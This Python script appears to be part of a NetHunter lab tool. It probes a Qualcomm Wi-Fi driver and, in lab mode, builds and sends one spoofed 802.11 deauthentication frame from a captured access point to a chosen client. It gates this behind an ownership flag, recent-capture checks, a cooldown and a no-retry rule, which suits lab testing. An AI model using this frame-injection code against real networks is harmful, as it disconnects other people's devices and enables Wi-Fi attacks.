#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
"""Read-only preflight, capture checks, and one explicitly selected lab frame."""
import csv
import datetime
import json
import os
from pathlib import Path
import re
import socket
import struct
import sys
import time

from netlink import C, Netlink, a, attrs, number, u32

BASE = Path('/tmp/hijacker-qca')
MODE = Path('/sys/module/qca_cld3_peach_v2/parameters/con_mode')


def mac(value):
    if not isinstance(value, str) or not re.fullmatch(r'(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', value):
        raise ValueError('Invalid MAC address')
    raw = bytes.fromhex(value.replace(':', ''))
    if raw[0] & 1 or raw == bytes(6):
        raise ValueError('Only individual unicast addresses are supported')
    return value.lower()


def validate_request(request):
    if request.get('channel') != 6:
        raise ValueError('Only channel 6 is validated')
    if request.get('bssid', 'all') != 'all':
        mac(request['bssid'])


def interface(nl):
    index = socket.if_nametoindex('wlan0')
    fields = attrs(nl.command('GET_INTERFACE', a('IFINDEX', u32(index)))[0][1][4:])
    if number(fields[C['NL80211_ATTR_IFTYPE']]) != 2 or MODE.read_text().strip() != '0':
        raise RuntimeError('Managed wlan0 is required')
    return index, fields


def probe(job, request):
    validate_request(request)
    if os.geteuid() != 0 or not Path('/proc/self/status').exists() or not MODE.exists():
        raise RuntimeError('NetHunter must be running with root and proc/sys mounts')
    with open('/dev/null', 'rb'):
        pass
    nl = Netlink()
    try:
        index, fields = interface(nl)
        replies = nl.command('GET_WIPHY', a('WIPHY', fields[C['NL80211_ATTR_WIPHY']])
                             + a('SPLIT_WIPHY_DUMP', b''), True)
        features = b''
        for _, body, _ in replies:
            features = attrs(body[4:]).get(C['NL80211_ATTR_EXT_FEATURES'], features)
        bit = C['NL80211_EXT_FEATURE_AUTH_AND_DEAUTH_RANDOM_TA']
        data = {'ifindex': index, 'mode': 0, 'iftype': 2,
                'auth_deauth_random_ta': len(features) > bit // 8 and bool(features[bit // 8] & (1 << (bit % 8))),
                'model': (job / 'model.txt').read_text().strip(),
                'build': (job / 'build.txt').read_text().strip(),
                'kernel': (job / 'kernel.txt').read_text().strip(),
                'firmware_loader_path': (job / 'firmware.txt').read_text().strip()}
        (job / 'device.json').write_text(json.dumps(data, indent=2))
        return data
    finally:
        nl.sock.close()


def observations(path):
    aps, stations = {}, {}
    station_section = False
    for row in csv.reader(path.read_text(errors='replace').splitlines(), skipinitialspace=True):
        if not row or not row[0].strip():
            continue
        if row[0].startswith('Station MAC'):
            station_section = True
            continue
        try:
            address = mac(row[0].strip())
            if station_section and len(row) >= 6:
                stations[address] = {'ap': mac(row[5].strip()), 'last_seen': row[2].strip(), 'frames': int(row[4])}
            elif not station_section and len(row) >= 14:
                aps[address] = {'channel': int(row[3]), 'last_seen': row[2].strip(), 'beacons': int(row[9]), 'ssid': row[13]}
        except (ValueError, IndexError):
            continue  # Header or an incomplete row while airodump rewrites the CSV.
    return aps, stations


def validate_target(request, source, now):
    if request.get('authorized_owned_hardware') is not True:
        raise ValueError('Explicit authorization is required')
    ap, client = mac(request['ap']), mac(request['client'])
    if ap == client:
        raise ValueError('AP and client must differ')
    aps, stations = observations(source)
    if ap not in aps or client not in stations or stations[client]['ap'] != ap:
        raise ValueError('Selected AP/client association is absent from the capture')
    if aps[ap]['channel'] != 6 or aps[ap]['beacons'] <= 0 or stations[client]['frames'] <= 0:
        raise ValueError('Selected AP/client has no validated channel-6 traffic')
    for seen in (aps[ap]['last_seen'], stations[client]['last_seen']):
        stamp = datetime.datetime.strptime(seen, '%Y-%m-%d %H:%M:%S').replace(tzinfo=datetime.timezone.utc).timestamp()
        if not 0 <= now - stamp <= 120:
            raise ValueError('Selection expired; capture the client again')
    return ap, client


def single_frame(job, request):
    validate_request(request)
    sid = request.get('capture_session', '')
    if not re.fullmatch(r'[a-zA-Z0-9_-]{1,100}', sid):
        raise ValueError('Invalid capture session')
    ap, client = validate_target(request, BASE / sid / 'capture-01.csv', time.time())
    device = json.loads((job / 'device.json').read_text())
    if not device['auth_deauth_random_ta']:
        raise RuntimeError('Required management TX feature is absent')
    cooldown = BASE / 'last-attempt.json'
    if cooldown.exists() and time.time() - json.loads(cooldown.read_text())['epoch'] < 30:
        raise RuntimeError('Wait 30 seconds before another single-frame test')
    nl = Netlink()
    try:
        index, _ = interface(nl)  # Never reuse an ifindex across a driver transition.
        source, dest = bytes.fromhex(ap.replace(':', '')), bytes.fromhex(client.replace(':', ''))
        frame = struct.pack('<HH', 0x00c0, 0) + dest + source + source + struct.pack('<HH', 0, 3)
        attempt = {'epoch': time.time(), 'userspace_submission_limit': 1, 'state': 'prepared; outcome unconfirmed', 'ap': ap, 'client': client,
                   'ifindex': index, 'frequency': 2437, 'frame_hex': frame.hex()}
        # A timeout after this marker is ambiguous; never automatically retry.
        (job / 'attempt.json').write_text(json.dumps(attempt, indent=2))
        cooldown.write_text(json.dumps(attempt))
        replies = nl.command('FRAME', a('IFINDEX', u32(index)) + a('WIPHY_FREQ', u32(2437))
                             + a('FRAME', frame) + a('OFFCHANNEL_TX_OK', b'') + a('DURATION', u32(100)))
        cookies = [number(attrs(body[4:])[C['NL80211_ATTR_COOKIE']]) for _, body, _ in replies
                   if C['NL80211_ATTR_COOKIE'] in attrs(body[4:])]
        statuses = [nl.tx_status(cookie) for cookie in cookies]
        matched = [s for s in statuses if s and s['cookie'] in cookies and s['ifindex'] == index and s['frame_hex'] == frame.hex()]
        return {'kernel_accepted': True, 'tx_status': statuses, 'matching_ack': any(s['ack'] for s in matched),
                'userspace_submissions': 1, 'interpretation': 'Driver ACK is not proof of disconnection or PMF bypass.'}
    finally:
        nl.sock.close()


def capture_result(job):
    aps, stations = observations(job / 'capture-01.csv')
    path = job / 'capture-01.cap'
    with path.open('rb') as capture:
        magic = capture.read(4)
    if path.stat().st_size < 24 or magic not in (b'\xd4\xc3\xb2\xa1', b'\xa1\xb2\xc3\xd4'):
        raise ValueError('No valid pcap header was produced')
    return {'aps': len(aps), 'stations': len(stations), 'pcap_bytes': path.stat().st_size,
            'channel': 6, 'managed_mode': MODE.read_text().strip() == '0', 'capture_duration_limit': 60}


def main():
    action, job_name = sys.argv[1:]
    job = Path(job_name)
    try:
        request = json.loads((job / 'request.json').read_text())
        if action == 'probe':
            data = probe(job, request)
        elif action == 'capture':
            data = capture_result(job)
        elif action == 'lab':
            data = single_frame(job, request)
        else:
            raise ValueError('Unknown action')
        result = {'ok': True, 'action': action, 'epoch': time.time(), **data}
    except Exception as error:
        result = {'ok': False, 'action': action, 'epoch': time.time(), 'error': f'{type(error).__name__}: {error}'}
        if action == 'lab' and (job / 'attempt.json').exists():
            result['submission_may_have_occurred'] = True
            result['interpretation'] = 'Transmission outcome is uncertain. No automatic retry was made.'
    (job / 'result.json').write_text(json.dumps(result, indent=2))
    print('RESULT:' + json.dumps(result), flush=True)
    return 0 if result['ok'] else 1


if __name__ == '__main__':
    sys.exit(main())
